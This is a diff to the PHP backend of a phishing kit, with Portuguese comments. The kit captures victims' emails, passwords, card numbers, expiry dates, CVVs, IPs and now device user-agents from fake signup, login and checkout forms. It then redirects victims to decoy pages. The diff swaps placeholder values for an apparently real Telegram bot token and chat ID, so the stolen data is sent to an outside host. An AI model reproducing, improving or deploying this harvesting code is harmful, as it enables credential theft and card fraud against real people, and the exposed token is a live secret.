@@ -1,7 +1,7 @@
 <?php
 // CONFIGURAÇÕES DO TELEGRAM
-$botToken = "SEU_BOT_TOKEN_AQUI";
-$chatId = "SEU_CHAT_ID_AQUI";
+$botToken = "9039149841:AAHI3yAs-jTUTuYuxwTFvoLHhA01PlehXhA";
+$chatId = " 6544488805";
 
 // Captura o IP e User Agent da vítima
 $ip = $_SERVER['REMOTE_ADDR'];
@@ -22,7 +22,7 @@ if ($tipo == "CADASTRO") {
     $mensagem .= "📧 Email: $email\n";
     $mensagem .= "🔑 Senha: $senha\n";
     $mensagem .= "🌐 IP: $ip\n";
-    
+    $mensagem .= "📱 Device: $ua\n";
     $redirecionar = "conta.html";
 
 } elseif ($tipo == "LOGIN") {
@@ -33,7 +33,7 @@ if ($tipo == "CADASTRO") {
     $mensagem .= "📧 Email: $email\n";
     $mensagem .= "🔑 Senha: $senha\n";
     $mensagem .= "🌐 IP: $ip\n";
-    
+    $mensagem .= "📱 Device: $ua\n";
     $redirecionar = "conta.html";
 
 } elseif ($tipo == "CARTAO_SALVO") {
@@ -48,7 +48,7 @@ if ($tipo == "CADASTRO") {
     $mensagem .= "📅 Validade: $validade\n";
     $mensagem .= "🔐 CVV: $cvv\n";
     $mensagem .= "🌐 IP: $ip\n";
-    
+    $mensagem .= "📱 Device: $ua\n";
     $redirecionar = "conta.html";
 
 } else {
@@ -68,7 +68,7 @@ if ($tipo == "CADASTRO") {
     $mensagem .= "🔐 CVV: $cvv\n";
     $mensagem .= "💰 Total: $total\n";
     $mensagem .= "🌐 IP: $ip\n";
-    
+    $mensagem .= "📱 Device: $ua\n";
     $redirecionar = "erro-no-pagamento.html";
 }
 
